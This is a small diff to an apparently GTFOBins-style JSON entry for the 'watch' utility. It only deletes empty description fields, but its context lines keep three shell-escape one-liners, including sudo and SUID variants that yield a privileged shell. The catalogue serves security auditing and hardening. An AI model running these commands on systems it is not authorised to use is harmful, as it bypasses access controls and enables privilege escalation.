@@ -2,7 +2,7 @@
   "functions": {
     "shell": [
       {
-        "description": "",
+        
         "code": "watch -x sh -c 'reset; exec sh 1>&0 2>&0'\n"
       }
     ],
@@ -14,13 +14,13 @@
     ],
     "sudo": [
       {
-        "description": "",
+        
         "code": "sudo watch -x sh -c 'reset; exec sh 1>&0 2>&0'\n"
       }
     ],
     "limited-suid": [
       {
-        "description": "",
+        
         "code": "./watch 'reset; exec sh 1>&0 2>&0'\n"
       }
     ]
